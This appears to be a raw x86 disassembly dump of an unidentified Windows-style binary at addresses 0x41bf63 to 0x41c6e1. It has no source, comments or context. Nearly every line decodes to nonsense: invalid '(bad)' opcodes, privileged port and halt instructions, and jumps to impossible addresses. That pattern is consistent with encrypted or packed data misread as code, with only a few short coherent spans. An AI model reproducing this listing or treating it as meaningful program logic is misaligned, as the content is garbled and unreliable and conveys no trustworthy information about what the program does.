  41bf63:	mov    al,cl
  41bf65:	mov    BYTE PTR [esi],ah
  41bf67:	add    eax,0x8db5fecf
  41bf6c:	push   eax
  41bf6d:	nop
  41bf6e:	jae    0x41bf10
  41bf70:	js     0x41bf2a
  41bf72:	lock lods al,BYTE PTR ds:[esi]
  41bf74:	dec    ebx
  41bf75:	jge    0x41bfcf
  41bf77:	(bad)  
  41bf78:	xchg   ecx,eax
  41bf79:	sar    ecx,1
  41bf7b:	push   ecx
  41bf7c:	(bad)  
  41bf7d:	neg    DWORD PTR [esi]
  41bf7f:	xlat   BYTE PTR ds:[ebx]
  41bf80:	shl    esi,cl
  41bf82:	pop    eax
  41bf83:	(bad)  [edi+0xf]
  41bf86:	mov    dh,0xce
  41bf88:	and    eax,esp
  41bf8a:	sbb    edx,ebx
  41bf8c:	ja     0x41bfd7
  41bf8e:	imul   esi,DWORD PTR [esi-0x6198472b],0x84963789
  41bf98:	fcmovnu st,st(5)
  41bf9a:	mov    edx,0x15262b2b
  41bf9f:	jae    0x41bf8c
  41bfa1:	sbb    BYTE PTR [esi-0x2a],dh
  41bfa4:	xchg   ecx,eax
  41bfa5:	jmp    DWORD PTR [esp+eax*1-0x753833e0]
  41bfac:	xlat   BYTE PTR ds:[ebx]
  41bfad:	jle    0x41bf37
  41bfaf:	dec    edx
  41bfb0:	inc    esi
  41bfb1:	retf   0xe53e
  41bfb4:	pop    ebp
  41bfb5:	cdq    
  41bfb6:	ss shl edx,1
  41bfb9:	out    0x47,eax
  41bfbb:	imul   ebx,DWORD PTR [ecx+edi*1-0x7372757a],0x3272980a
  41bfc6:	add    BYTE PTR [ebx],bh
  41bfc8:	enter  0x850f,0x8d
  41bfcc:	hlt    
  41bfcd:	(bad)  
  41bfce:	dec    DWORD PTR [ebx+0x5e9de]
  41bfd4:	add    BYTE PTR [eax],al
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	adc    esi,DWORD PTR [edi+0x7a]
  41bff2:	fwait
  41bff3:	mov    eax,0x10787fe8
  41bff8:	jle    0x41c072
  41bffa:	js     0x41c037
  41bffc:	pop    ss
  41bffd:	mov    ebx,ss
  41bfff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c000:	push   0xffffffdc
  41c002:	retf   
  41c003:	bound  ecx,QWORD PTR ds:0x73745a2
  41c009:	daa    
  41c00a:	mov    WORD PTR [ecx+0x7efe42ff],fs
  41c010:	(bad)  
  41c011:	and    DWORD PTR [edi+0xe8189c6],ebx
  41c017:	fidiv  WORD PTR [edx]
  41c019:	sub    al,0x1c
  41c01b:	sbb    eax,0xf3b06889
  41c020:	push   0xf332f793
  41c025:	aad    0x4d
  41c027:	das    
  41c028:	dec    ecx
  41c029:	pop    ss
  41c02a:	xor    edi,DWORD PTR [edi+0x5f]
  41c02d:	cwde   
  41c02e:	test   eax,0x4b11a1e0
  41c033:	add    ch,BYTE PTR [eax-0x1340dfb7]
  41c039:	add    eax,0xe7ffc37d
  41c03e:	scas   al,BYTE PTR es:[edi]
  41c03f:	ficom  WORD PTR [edx-0x2]
  41c042:	push   edi
  41c043:	push   eax
  41c044:	int3   
  41c045:	mov    esp,0x2ca28d54
  41c04a:	out    dx,al
  41c04b:	add    esp,DWORD PTR [ecx]
  41c04d:	imul   eax,DWORD PTR [edi+0x7c196dc5],0x34
  41c054:	repz out 0xd8,al
  41c057:	mov    eax,0xbe6a9de2
  41c05c:	mov    ebx,DWORD PTR [esi+0x7e727f09]
  41c062:	rol    BYTE PTR [ebp+0x6],cl
  41c065:	jmp    0x41c0af
  41c067:	test   BYTE PTR [esp+eax*2],bl
  41c06a:	retf   0x11df
  41c06d:	or     DWORD PTR [eax-0x4],0x36
  41c071:	jmp    0x41c024
  41c073:	mov    esi,0xa52422cd
  41c078:	fneni(8087 only) 
  41c07a:	(bad)  
  41c07b:	ret    
  41c07c:	dec    edi
  41c07d:	scas   eax,DWORD PTR es:[edi]
  41c07e:	dec    edi
  41c07f:	xor    BYTE PTR [edi],bh
  41c081:	xchg   edx,eax
  41c082:	and    dh,ch
  41c084:	xchg   ecx,eax
  41c085:	fidiv  DWORD PTR [eax+0x5c7e0765]
  41c08b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c08c:	dec    ecx
  41c08d:	xchg   edi,eax
  41c08e:	sbb    BYTE PTR [edx+0x51],ah
  41c091:	dec    esp
  41c092:	inc    ecx
  41c093:	sbb    DWORD PTR [edi-0x13e2ea6a],esp
  41c099:	pop    ds
  41c09a:	jae    0x41c06f
  41c09c:	xor    DWORD PTR ds:0xed294ad2,0x4e
  41c0a3:	push   cs
  41c0a4:	mov    edi,0x497f31b
  41c0a9:	xchg   ecx,eax
  41c0aa:	in     eax,dx
  41c0ab:	sahf   
  41c0ac:	test   eax,0xf3574887
  41c0b1:	fcom   QWORD PTR [ebx-0x41]
  41c0b4:	mov    ebp,0x32bec7e0
  41c0b9:	mov    ah,0xd0
  41c0bb:	sub    BYTE PTR [esi-0x72cf207],ch
  41c0c1:	sub    eax,0xf9c57ea2
  41c0c6:	mov    ecx,0x96b1b6d3
  41c0cb:	cmp    ch,0xb1
  41c0ce:	xchg   DWORD PTR [esi+0x6e],ecx
  41c0d1:	jb     0x41c05e
  41c0d3:	push   0xa560aa6c
  41c0d8:	and    eax,0x516e2229
  41c0dd:	add    esi,DWORD PTR [edx]
  41c0df:	repz xor edi,eax
  41c0e2:	adc    bl,ch
  41c0e4:	or     DWORD PTR [ebx-0x35],edi
  41c0e7:	inc    edi
  41c0e8:	mov    ds:0x94ecb99d,al
  41c0ed:	mov    esp,eax
  41c0ef:	xchg   esp,eax
  41c0f0:	cmp    dh,dl
  41c0f2:	adc    eax,0x27fe9014
  41c0f7:	fmul   QWORD PTR [edx+0x34]
  41c0fa:	fcom   DWORD PTR [edx-0x990bf54]
  41c100:	outs   dx,BYTE PTR ds:[esi]
  41c101:	xor    eax,0x2c470e08
  41c106:	cmp    dh,cl
  41c108:	pop    edi
  41c109:	xchg   al,ah
  41c10b:	test   al,0x8
  41c10d:	out    0x3b,al
  41c10f:	pop    es
  41c110:	sbb    eax,0xe83e8fe5
  41c115:	mov    ecx,0xdb6a9bd4
  41c11a:	mov    dl,0x25
  41c11c:	push   edi
  41c11d:	inc    esp
  41c11e:	inc    edi
  41c11f:	pop    ecx
  41c120:	repnz xor BYTE PTR [edx],ah
  41c123:	dec    edx
  41c124:	repnz pop esi
  41c126:	inc    esp
  41c127:	jb     0x41c19b
  41c129:	fwait
  41c12a:	sub    ebp,DWORD PTR [edi]
  41c12c:	dec    edi
  41c12d:	mov    ecx,0x728499c
  41c132:	jae    0x41c18c
  41c134:	add    BYTE PTR [ecx-0x3bd0dce3],ch
  41c13a:	je     0x41c119
  41c13c:	sub    DWORD PTR [ebp-0x14],edi
  41c13f:	ficom  WORD PTR [eax-0x19a869e]
  41c145:	ja     0x41c124
  41c147:	int    0xc
  41c149:	sbb    ecx,DWORD PTR [ecx+ebp*8-0x4a]
  41c14d:	mov    dh,0x74
  41c14f:	(bad)  
  41c150:	pop    ebp
  41c151:	retf   
  41c152:	jnp    0x41c16e
  41c154:	mov    al,ds:0x540ab204
  41c159:	cld    
  41c15a:	sub    eax,0xdd8ea3d6
  41c15f:	pop    eax
  41c160:	hlt    
  41c161:	aad    0xb8
  41c163:	dec    ebx
  41c164:	dec    esi
  41c165:	sub    eax,0x62a59da8
  41c16a:	cmp    DWORD PTR [ebp+0x24afcdd3],edi
  41c170:	lahf   
  41c171:	in     eax,dx
  41c172:	iret   
  41c173:	int3   
  41c174:	bound  edi,QWORD PTR [ebp+0x480c1b94]
  41c17a:	call   0x2dd74cbb
  41c17f:	rcl    edx,cl
  41c181:	inc    eax
  41c182:	les    edi,FWORD PTR [ebp+0x5862deab]
  41c188:	mov    ds:0xf5f3a375,al
  41c18d:	inc    esp
  41c18e:	mov    esi,0xf0623d76
  41c193:	imul   edi,DWORD PTR [eax+0x84973ff],0xfffffff1
  41c19a:	nop
  41c19b:	hlt    
  41c19c:	out    dx,eax
  41c19d:	sbb    BYTE PTR [ecx+0x2d836c0e],ch
  41c1a3:	enter  0x41b9,0x14
  41c1a7:	xlat   BYTE PTR ds:[ebx]
  41c1a8:	or     esp,esi
  41c1aa:	lods   al,BYTE PTR ds:[esi]
  41c1ab:	ret    
  41c1ac:	mov    DWORD PTR [edi],esp
  41c1ae:	push   ebx
  41c1af:	adc    DWORD PTR [ebx-0x1be6494d],ecx
  41c1b5:	hlt    
  41c1b6:	adc    ecx,ebx
  41c1b8:	inc    esi
  41c1b9:	mov    ebp,DWORD PTR [edi-0x7810c342]
  41c1bf:	popf   
  41c1c0:	test   eax,0xb13e3102
  41c1c5:	mov    bh,0x5e
  41c1c7:	jmp    0xe8e81fb3
  41c1cc:	imul   edi
  41c1ce:	lea    edx,[ebp-0x4a19d5f7]
  41c1d4:	test   al,0x70
  41c1d6:	dec    eax
  41c1d7:	adc    bh,BYTE PTR [eax]
  41c1d9:	add    ecx,DWORD PTR [ecx+0x1]
  41c1dc:	pop    ds
  41c1dd:	jne    0x41c160
  41c1df:	jnp    0x41c1bd
  41c1e1:	scas   eax,DWORD PTR es:[edi]
  41c1e2:	(bad)  
  41c1e3:	pop    eax
  41c1e4:	addr16 pop ecx
  41c1e6:	mov    WORD PTR [esi-0x70],?
  41c1e9:	lds    edx,FWORD PTR [esi+eax*1]
  41c1ec:	xor    DWORD PTR [ecx-0x30],ebx
  41c1ef:	xor    al,0x40
  41c1f1:	in     eax,dx
  41c1f2:	mov    esp,DWORD PTR [esi+esi*4+0x33263d1a]
  41c1f9:	ss xchg ecx,eax
  41c1fb:	arpl   WORD PTR [eax-0x40],bp
  41c1fe:	loope  0x41c20d
  41c200:	push   edx
  41c201:	push   DWORD PTR [edx-0x6fc4827d]
  41c207:	mov    ss,WORD PTR [esi+0x78925b20]
  41c20d:	repz inc ebp
  41c20f:	ins    BYTE PTR es:[edi],dx
  41c210:	push   esp
  41c211:	xor    dl,BYTE PTR [ebx]
  41c213:	xor    eax,0x7510850
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	sub    DWORD PTR [edi+0x33],0x7fee501b
  41c232:	js     0x41c244
  41c234:	jle    0x41c2ae
  41c236:	js     0x41c25a
  41c238:	call   DWORD PTR [esi+eax*8+0x32469f78]
  41c23f:	xor    dl,BYTE PTR [edi]
  41c241:	outs   dx,BYTE PTR ds:[esi]
  41c242:	aam    0x7e
  41c244:	mov    al,ds:0xfe46e02f
  41c249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c24a:	cmp    eax,0xe0147ed9
  41c24f:	in     eax,dx
  41c250:	jge    0x41c26d
  41c252:	cmp    al,0x33
  41c254:	jge    0x41c294
  41c256:	fucomip st,st(3)
  41c258:	mov    ecx,esp
  41c25a:	push   ebx
  41c25b:	xchg   ecx,eax
  41c25c:	(bad)  
  41c25d:	(bad)  [eax]
  41c25f:	in     al,dx
  41c260:	adc    ebx,ecx
  41c262:	dec    esi
  41c263:	rol    dh,0x7c
  41c266:	and    al,0xf9
  41c268:	adc    edx,eax
  41c26a:	ror    edx,1
  41c26c:	and    BYTE PTR [ebx+0x26],bh
  41c26f:	aam    0x97
  41c271:	jne    0x41c2bc
  41c273:	les    ebx,FWORD PTR [esi]
  41c275:	xchg   esi,eax
  41c276:	adc    eax,0x202f9505
  41c27b:	dec    esi
  41c27c:	push   ecx
  41c27d:	mov    ebx,esp
  41c27f:	cmp    eax,ecx
  41c281:	push   edx
  41c282:	jb     0x41c2e1
  41c284:	xchg   edx,eax
  41c285:	push   es
  41c286:	jb     0x41c273
  41c288:	hlt    
  41c289:	dec    ecx
  41c28a:	fsubr  QWORD PTR [ecx+0x106e96a9]
  41c290:	cmp    cl,BYTE PTR [ecx-0x6a]
  41c293:	dec    edx
  41c294:	pop    eax
  41c295:	add    BYTE PTR [esi-0x474639f5],ch
  41c29b:	or     eax,0x32030cbc
  41c2a0:	fs fdiv st(6),st
  41c2a3:	ins    BYTE PTR es:[edi],dx
  41c2a4:	aas    
  41c2a5:	stc    
  41c2a6:	popa   
  41c2a7:	push   ecx
  41c2a8:	test   DWORD PTR [ebx],eax
  41c2aa:	mov    ecx,0xce64e456
  41c2af:	pop    esp
  41c2b0:	pop    eax
  41c2b1:	fucom  st(6)
  41c2b3:	fisttp QWORD PTR [eax-0x7e1ba45]
  41c2b9:	hlt    
  41c2ba:	xor    ecx,DWORD PTR [ebx+0x6c]
  41c2bd:	sahf   
  41c2be:	sbb    al,0x21
  41c2c0:	mov    ecx,0x560cd176
  41c2c5:	mov    dh,0x68
  41c2c7:	in     al,0x1c
  41c2c9:	ins    BYTE PTR es:[edi],dx
  41c2ca:	loopne 0x41c2af
  41c2cc:	stos   DWORD PTR es:[edi],eax
  41c2cd:	jp     0x41c279
  41c2cf:	scas   al,BYTE PTR es:[edi]
  41c2d0:	in     al,0x2
  41c2d2:	test   BYTE PTR ds:0x954c2420,0x12
  41c2d9:	pop    ecx
  41c2da:	cmp    DWORD PTR [ebx],esp
  41c2dc:	xor    eax,0xc8d9c8c6
  41c2e1:	push   eax
  41c2e2:	cld    
  41c2e3:	and    BYTE PTR [ebx-0x38980030],ah
  41c2e9:	pop    edx
  41c2ea:	jp     0x41c299
  41c2ec:	mov    esp,0x42951c
  41c2f1:	nop
  41c2f2:	ins    DWORD PTR es:[edi],dx
  41c2f3:	hlt    
  41c2f4:	(bad)  
  41c2f5:	push   esp
  41c2f6:	fstp   QWORD PTR [esi+0x5a3cb655]
  41c2fc:	mov    dl,0x87
  41c2fe:	pop    esi
  41c2ff:	shl    BYTE PTR gs:[edx+0x70a3202c],cl
  41c306:	inc    ebp
  41c307:	pop    ebp
  41c308:	in     eax,dx
  41c309:	dec    eax
  41c30a:	adc    eax,0x3602d6de
  41c30f:	shl    DWORD PTR [edi+0x40],1
  41c312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c313:	mov    esp,0x18f67bbe
  41c318:	call   0x1a7f9de7
  41c31d:	mov    ah,0xd9
  41c31f:	adc    ah,dl
  41c321:	in     al,dx
  41c322:	cdq    
  41c323:	call   0x6bab:0xaafe1827
  41c32a:	out    0xb5,eax
  41c32c:	hlt    
  41c32d:	add    eax,0x6135794c
  41c332:	mov    esp,0x8c5b87d7
  41c337:	dec    ebp
  41c338:	xchg   edi,ebp
  41c33a:	pop    ebp
  41c33b:	dec    ebp
  41c33c:	ins    DWORD PTR es:[edi],dx
  41c33d:	pop    ebx
  41c33e:	push   esi
  41c33f:	push   esi
  41c340:	and    DWORD PTR [eax-0x63bb858e],0x46490b8e
  41c34a:	les    edx,FWORD PTR [esi+eiz*2]
  41c34d:	jmp    0x41c315
  41c34f:	and    DWORD PTR [ecx+0x8010697],eax
  41c355:	push   ebx
  41c356:	sbb    eax,0x86c8a73b
  41c35b:	cli    
  41c35c:	mov    ds:0x9be07ac0,al
  41c361:	mov    eax,ds:0x9e475222
  41c366:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c367:	dec    ebx
  41c368:	inc    esi
  41c369:	ins    DWORD PTR es:[edi],dx
  41c36a:	cmp    al,0xfb
  41c36c:	mov    esi,0x6654c454
  41c371:	nop
  41c372:	jb     0x41c328
  41c374:	leave  
  41c375:	jbe    0x41c374
  41c377:	mov    al,0x1f
  41c379:	sbb    al,BYTE PTR [ebp-0x65]
  41c37c:	sub    BYTE PTR [eax+0x7c653d21],ah
  41c382:	hlt    
  41c383:	icebp  
  41c384:	pop    es
  41c385:	push   esi
  41c386:	cmp    DWORD PTR [esi],ebx
  41c388:	dec    eax
  41c389:	cmp    BYTE PTR [eax+0x63b9d649],0x63
  41c390:	xor    bh,dh
  41c392:	push   eax
  41c393:	sahf   
  41c394:	mov    eax,0x363e3322
  41c399:	adc    dl,cl
  41c39b:	push   edx
  41c39c:	jg     0x41c3ae
  41c39e:	ss hlt 
  41c3a0:	or     ecx,ebx
  41c3a2:	enter  0x232e,0xc2
  41c3a6:	cmp    al,0x0
  41c3a8:	in     eax,0xf5
  41c3aa:	in     eax,dx
  41c3ab:	bnd jg 0x41c37b
  41c3ae:	iret   
  41c3af:	dec    ebp
  41c3b0:	repz in al,dx
  41c3b2:	daa    
  41c3b3:	mov    eax,0x46439a90
  41c3b8:	scas   al,BYTE PTR es:[edi]
  41c3b9:	stos   BYTE PTR es:[edi],al
  41c3ba:	lods   eax,DWORD PTR ds:[esi]
  41c3bb:	fxsave [ecx]
  41c3be:	or     ebx,DWORD PTR [esi]
  41c3c0:	or     BYTE PTR [edx+0x53],ch
  41c3c3:	imul   ebx,DWORD PTR [edi-0x71],0x66
  41c3c7:	mov    dl,0xb2
  41c3c9:	push   ecx
  41c3ca:	add    DWORD PTR [edx+0x49],0xffffffc4
  41c3ce:	xchg   BYTE PTR [ecx-0xeaedaca],ch
  41c3d4:	mov    esi,0x7637efb4
  41c3d9:	imul   BYTE PTR [ecx]
  41c3db:	lds    edi,FWORD PTR [eax+ebx*1-0x40346505]
  41c3e2:	fwait
  41c3e3:	mov    BYTE PTR [edi-0x115ade16],dh
  41c3e9:	xchg   DWORD PTR [ebx+edi*8+0x4b83980],edi
  41c3f0:	ret    
  41c3f1:	pop    ss
  41c3f2:	test   BYTE PTR [eax],0xe6
  41c3f5:	dec    ebp
  41c3f6:	adc    edx,DWORD PTR [eax-0xea51835]
  41c3fc:	add    eax,0x66b6d5c8
  41c401:	fwait
  41c402:	xchg   ecx,eax
  41c403:	xor    DWORD PTR [ebx],ecx
  41c405:	imul   esi
  41c407:	dec    esp
  41c408:	lods   eax,DWORD PTR ds:[esi]
  41c409:	push   es
  41c40a:	loope  0x41c3c2
  41c40c:	fiadd  WORD PTR [edx+ebp*1]
  41c40f:	pop    edi
  41c410:	mov    cl,0xa
  41c412:	ins    BYTE PTR es:[edi],dx
  41c413:	cmp    eax,0x497a1f67
  41c418:	or     al,0x50
  41c41a:	rol    BYTE PTR [edx],0x74
  41c41d:	inc    DWORD PTR [esp+edi*1+0x7b956118]
  41c424:	stc    
  41c425:	out    0xe8,al
  41c427:	sub    ch,dl
  41c429:	or     esp,DWORD PTR [eax-0x55]
  41c42c:	ins    BYTE PTR es:[edi],dx
  41c42d:	adc    al,0x4c
  41c42f:	jp     0x41c3f0
  41c431:	pushf  
  41c432:	inc    esi
  41c433:	aam    0x25
  41c435:	xor    edi,DWORD PTR [ecx]
  41c437:	fnstcw WORD PTR [ecx-0x6f]
  41c43a:	add    DWORD PTR [esi],edi
  41c43c:	outs   dx,DWORD PTR ds:[esi]
  41c43d:	mov    al,ds:0xa52bfc82
  41c442:	ss jp  0x41c4b6
  41c445:	and    DWORD PTR [ecx-0x4a],ecx
  41c448:	fstp   TBYTE PTR [esi-0x45a31ace]
  41c44e:	add    DWORD PTR [ecx+0x30e9f445],ecx
  41c454:	add    al,BYTE PTR [eax]
  41c456:	add    al,dl
  41c458:	ret    0xc8c4
  41c45b:	fcmovbe st,st(6)
  41c45d:	aam    0xca
  41c45f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c460:	mov    dh,0x58
  41c462:	jp     0x41c42c
  41c464:	push   edx
  41c465:	rcl    DWORD PTR [edi],cl
  41c467:	push   0x10787fec
  41c46c:	jle    0x41c4e6
  41c46e:	js     0x41c4ef
  41c470:	cmp    al,0x77
  41c472:	push   edx
  41c473:	js     0x41c430
  41c475:	into   
  41c476:	sbb    BYTE PTR ds:[esi],dh
  41c479:	sbb    bl,BYTE PTR [ecx]
  41c47b:	mov    ah,BYTE PTR [ebx-0x3d7a5f14]
  41c481:	xor    BYTE PTR [eax-0x4],cl
  41c484:	sub    eax,0xaabef0a
  41c489:	jecxz  0x41c45e
  41c48b:	xor    eax,0x33c7ac19
  41c490:	bnd jne 0x41c4ed
  41c493:	dec    eax
  41c494:	scas   al,BYTE PTR es:[edi]
  41c495:	jecxz  0x41c454
  41c497:	mov    edi,0xd93a53a0
  41c49c:	cdq    
  41c49d:	jle    0x41c4fa
  41c49f:	test   DWORD PTR [esi],ecx
  41c4a1:	(bad)  
  41c4a2:	cmc    
  41c4a3:	xor    DWORD PTR es:[edx-0x79753c90],esp
  41c4aa:	and    DWORD PTR [eax-0x4a],esp
  41c4ad:	xor    DWORD PTR [edi+0x22],edi
  41c4b0:	in     eax,0xc9
  41c4b2:	in     al,dx
  41c4b3:	mov    al,0x5b
  41c4b5:	das    
  41c4b6:	fnstenv [ebp*2-0x11b45d25]
  41c4bd:	dec    ecx
  41c4be:	jmp    0x2322a5f6
  41c4c3:	imul   ecx,DWORD PTR [eax-0x5a],0xff8905c1
  41c4ca:	pop    edx
  41c4cb:	push   ecx
  41c4cc:	xor    eax,0x7a0a7784
  41c4d1:	pop    esi
  41c4d2:	ins    BYTE PTR es:[edi],dx
  41c4d3:	(bad)  
  41c4d4:	dec    ebx
  41c4d5:	or     DWORD PTR [ebx-0x75d0e216],eax
  41c4db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4dc:	jb     0x41c495
  41c4de:	stos   DWORD PTR es:[edi],eax
  41c4df:	push   ecx
  41c4e0:	mov    eax,0x936830ae
  41c4e5:	xor    al,0xe9
  41c4e7:	idiv   BYTE PTR [ebp+0x63e9f983]
  41c4ed:	add    dh,BYTE PTR es:[ecx+0x33]
  41c4f1:	add    eax,0x4cc99a74
  41c4f6:	nop
  41c4f7:	jecxz  0x41c47b
  41c4f9:	(bad)  
  41c4fa:	ins    DWORD PTR es:[edi],dx
  41c4fb:	add    al,BYTE PTR [eax+0x778494c2]
  41c501:	rol    eax,cl
  41c503:	or     eax,0x7016e8dd
  41c508:	in     eax,dx
  41c509:	les    edi,FWORD PTR [ebx]
  41c50b:	cmp    BYTE PTR [esp+esi*2+0xe4be1df],al
  41c512:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41c514:	ss rcr dh,cl
  41c517:	stos   BYTE PTR es:[edi],al
  41c518:	arpl   bp,ax
  41c51a:	pop    esi
  41c51b:	mov    al,ds:0x9ac703b3
  41c520:	ss retf 
  41c522:	mov    esi,0x3ca08cf7
  41c527:	sbb    BYTE PTR [esi],dl
  41c529:	xor    BYTE PTR [ebx],bh
  41c52b:	cmp    eax,0x974a8f65
  41c530:	xor    dh,BYTE PTR [esi]
  41c532:	xor    dl,BYTE PTR [ecx]
  41c534:	push   ds
  41c535:	pop    edi
  41c536:	xchg   esp,eax
  41c537:	adc    DWORD PTR [ebx+ebp*1+0x3664a038],ebx
  41c53e:	mov    edx,0x6cf79ab1
  41c543:	dec    ebx
  41c544:	in     eax,dx
  41c545:	push   ebp
  41c546:	add    eax,0x8b4563c5
  41c54b:	jns    0x41c55a
  41c54d:	sar    BYTE PTR [edx-0x75],1
  41c550:	mov    al,0x9e
  41c552:	dec    ebx
  41c553:	imul   ebx,DWORD PTR [ecx+0x42],0xffffffc7
  41c557:	dec    esi
  41c558:	gs aam 0x15
  41c55b:	or     BYTE PTR [esi+0x2a],bl
  41c55e:	xlat   BYTE PTR ds:[ebx]
  41c55f:	cmp    ebx,DWORD PTR [ecx+ebp*2-0x4]
  41c563:	icebp  
  41c564:	outs   dx,BYTE PTR ds:[esi]
  41c565:	cli    
  41c566:	sub    eax,0xe5cac6fa
  41c56b:	pop    esi
  41c56c:	ret    0x4564
  41c56f:	or     eax,0xdd64ae40
  41c574:	adc    eax,0xffffffbc
  41c577:	popa   
  41c578:	adc    BYTE PTR [eax+0x28561f44],bl
  41c57e:	xchg   ebp,eax
  41c57f:	mov    BYTE PTR [ecx-0x19264514],dl
  41c585:	mov    bl,0x10
  41c587:	aam    0x38
  41c589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c58a:	daa    
  41c58b:	ret    
  41c58c:	(bad)
  41c590:	mov    dh,BYTE PTR [edx+0xf]
  41c593:	push   cs
  41c594:	adc    BYTE PTR [esi+esi*2],dl
  41c597:	cli    
  41c598:	ja     0x41c538
  41c59a:	mov    ebx,0x444ad731
  41c59f:	mov    eax,ds:0x9e3f230e
  41c5a4:	in     al,dx
  41c5a5:	fwait
  41c5a6:	loopne 0x41c5d9
  41c5a8:	push   edi
  41c5a9:	push   esi
  41c5aa:	or     DWORD PTR [edx+0x486178e9],edx
  41c5b0:	push   ds
  41c5b1:	int3   
  41c5b2:	and    eax,0x9639bfc8
  41c5b7:	mov    bl,0x53
  41c5b9:	shl    DWORD PTR [edi],1
  41c5bb:	neg    DWORD PTR [ecx-0x66]
  41c5be:	mov    eax,ds:0xaf9d2cf5
  41c5c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5c4:	inc    eax
  41c5c5:	mov    al,0x5f
  41c5c8:	iret   
  41c5c9:	mov    esp,DWORD PTR [ebp+0x97e2fcd]
  41c5cf:	fcmovne st,st(2)
  41c5d1:	mov    DWORD PTR [ebp+0xaedb9a8],ebx
  41c5d7:	adc    cl,ch
  41c5d9:	(bad)  
  41c5da:	cld    
  41c5db:	dec    esi
  41c5dc:	in     eax,0xc
  41c5de:	and    BYTE PTR [ebp-0x3dda55f7],bh
  41c5e4:	push   ds
  41c5e5:	outs   dx,DWORD PTR ds:[esi]
  41c5e6:	lea    ebp,[eax+edx*1]
  41c5e9:	scas   eax,DWORD PTR es:[edi]
  41c5ea:	ja     0x41c607
  41c5ec:	mov    esp,ecx
  41c5ee:	fwait
  41c5ef:	ret    0x90db
  41c5f2:	into   
  41c5f3:	mov    eax,ds:0x63056e52
  41c5f8:	aaa    
  41c5f9:	retf   
  41c5fa:	mov    ?,WORD PTR [edx+0x38]
  41c5fd:	out    dx,al
  41c5fe:	mov    eax,0x5acc05fb
  41c603:	ins    DWORD PTR es:[edi],dx
  41c604:	test   eax,0x4c4e46c2
  41c609:	push   cs
  41c60a:	sti    
  41c60b:	das    
  41c60c:	xchg   esi,eax
  41c60d:	(bad)  
  41c60e:	icebp  
  41c60f:	imul   edi,DWORD PTR [edi-0x17],0x657e5ef2
  41c616:	lahf   
  41c617:	call   0x95df446e
  41c61c:	inc    DWORD PTR [ebx+0x6e]
  41c61f:	les    edi,FWORD PTR [ebx+0x68364372]
  41c625:	test   eax,0x47f66991
  41c62a:	inc    eax
  41c62b:	(bad)  
  41c62c:	and    bl,BYTE PTR [esi-0x56]
  41c62f:	test   eax,0x71450843
  41c634:	cmp    al,ch
  41c636:	fwait
  41c637:	in     al,dx
  41c638:	jne    0x41c5ee
  41c63a:	mov    edx,0x1dee0c6c
  41c63f:	cmp    bh,BYTE PTR [edi]
  41c641:	out    0xe8,eax
  41c643:	js     0x41c61f
  41c645:	ror    BYTE PTR ds:0x5e049fae,1
  41c64b:	pop    ds
  41c64c:	imul   dl
  41c64e:	ret    0xac4e
  41c651:	(bad)  [eax]
  41c653:	shl    DWORD PTR fs:[eax-0x20],cl
  41c657:	mov    dl,0xb7
  41c659:	xchg   edi,eax
  41c65a:	les    edx,FWORD PTR [eax]
  41c65c:	add    DWORD PTR [ecx],edx
  41c65e:	loop   0x41c60d
  41c660:	lods   al,BYTE PTR ds:[esi]
  41c661:	xchg   esp,eax
  41c662:	mov    BYTE PTR [edi+edi*8],0x2b
  41c666:	xor    al,0x78
  41c668:	cli    
  41c669:	fwait
  41c66a:	mov    bh,0xe3
  41c66c:	and    DWORD PTR [eax+0x34],edi
  41c66f:	xor    esp,DWORD PTR [edi+0x6f134f33]
  41c675:	(bad)  [edi+0x70]
  41c678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c679:	pop    ebx
  41c67a:	nop
  41c67b:	jnp    0x41c694
  41c67d:	addr16 adc eax,0x79de9c95
  41c683:	dec    ebp
  41c684:	call   0xdb74d36f
  41c689:	lea    eax,[ebp-0x10]
  41c68c:	add    ebx,DWORD PTR [eax]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0x9005773e,eax
  41c6cc:	call   0x8032c6d5
  41c6d1:	js     0x41c6e3
  41c6d3:	jle    0x41c74d
  41c6d5:	js     0x41c6f7
  41c6d7:	add    ah,BYTE PTR [eax+0x63]
  41c6da:	sub    al,0xc
  41c6dc:	cwde   
  41c6dd:	mov    ah,0x59
  41c6df:	inc    edi
  41c6e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6e1:	jnp    0x41c6df
